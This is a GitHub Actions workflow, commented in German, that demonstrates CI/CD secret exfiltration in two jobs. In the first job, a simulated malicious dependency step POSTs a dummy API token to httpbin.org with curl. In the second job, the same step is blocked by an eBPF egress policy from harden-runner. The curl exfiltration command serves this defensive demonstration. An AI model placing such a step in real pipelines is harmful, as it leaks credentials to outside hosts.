name: CICD-SEC-6 Secret Exfiltration Demo

on:
  push:
    branches: [ "main" ]
  workflow_dispatch: # Ermöglicht manuelles Starten über den GitHub Actions Button

jobs:
  # =========================================================================
  # JOB 1: UNGESCHÜTZTE PIPELINE (Der Angriff gelingt!)
  # =========================================================================
  unprotected-pipeline:
    name: 1. Unprotected (Attack Succeeds)
    runs-on: ubuntu-latest
    env:
      SUPER_SECRET_TOKEN: "CRITICAL_PROD_API_KEY_xyz987"

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Normal Build / Test Simulation
        run: |
          echo "Running standard build steps..."
          python3 app.py
          python3 test_app.py

      # HIER DER ANGRIFF: Bösartiges Skript stiehlt das Secret & schickt es per HTTP POST
      - name: Malicious Dependency Attack (Exfiltrate Secret)
        run: |
          echo "=== [ATTACK] Simulating Malicious Package ==="
          echo "Harvested Secret from Env: $SUPER_SECRET_TOKEN"
          
          echo "Sending secret data out to external server (httpbin.org)..."
          curl -s -X POST "https://httpbin.org/post" \
               -H "Content-Type: application/json" \
               -d "{\"stolen_secret\": \"$SUPER_SECRET_TOKEN\"}" \
               --max-time 10
          
          echo -e "\n\n[ATTACK RESULT] Secret was successfully exfiltrated over the internet!"

  # =========================================================================
  # JOB 2: GESCHÜTZTE PIPELINE (eBPF Countermeasure blockiert den Angriff!)
  # =========================================================================
  protected-pipeline:
    name: 2. Protected with eBPF Countermeasure (Attack Blocked)
    runs-on: ubuntu-latest
    env:
      SUPER_SECRET_TOKEN: "CRITICAL_PROD_API_KEY_xyz987"

    steps:
      # DIE GEGENMASSNAHME (eBPF Egress Blocker & DNS Snooping)
      # Wir erlauben NUR GitHub. Alles andere (auch httpbin.org) wird im Linux-Kernel gedroppt!
      - name: Start eBPF Countermeasure (Harden-Runner)
        uses: step-security/harden-runner@v2
        with:
          egress-policy: block
          allowed-endpoints: >
            github.com:443
            api.github.com:443

      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Normal Build / Test Simulation
        run: |
          echo "Running standard build steps..."
          python3 app.py
          python3 test_app.py

      # DERSERLBE ANGRIFF WIE OBEN: Diesmal schlägt die Gegenmaßnahme zu!
      - name: Malicious Dependency Attack (Attempt Exfiltration)
        run: |
          echo "=== [ATTACK] Trying to exfiltrate secret again ==="
          # curl schlägt fehl, da httpbin.org nicht in der Whitelist ist -> eBPF wirft das Paket weg!
          curl -v -X POST "https://httpbin.org/post" \
               -H "Content-Type: application/json" \
               -d "{\"stolen_secret\": \"$SUPER_SECRET_TOKEN\"}" \
               --connect-timeout 5 \
               --max-time 10 || echo -e "\n>>> [COUNTERMEASURE SUCCESS] Connection was blocked by eBPF egress filter! <<<"
